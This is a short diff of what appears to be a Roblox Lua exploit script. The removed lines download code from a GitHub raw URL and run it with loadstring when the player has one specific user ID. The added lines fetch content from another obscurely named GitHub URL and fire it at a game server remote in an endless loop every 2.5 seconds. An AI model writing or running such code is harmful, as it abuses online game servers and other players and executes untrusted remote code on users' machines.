@@ -1,4 +1,4 @@
-if game.Players.LocalPlayer.UserId == 6284583030 then
-loadstring(game:HttpGet("https://raw.githubusercontent.com/gabbytheduper/priv/main/asd", true))()
+local omsim = game:HttpGet("https://raw.githubusercontent.com/gabbytheduper/kmxcjeqyi/main/jzcmweu") while true do
+wait(2.5)
+workspace.__THINGS.__REMOTES.MAIN:FireServer("b", omsim)
 end
-
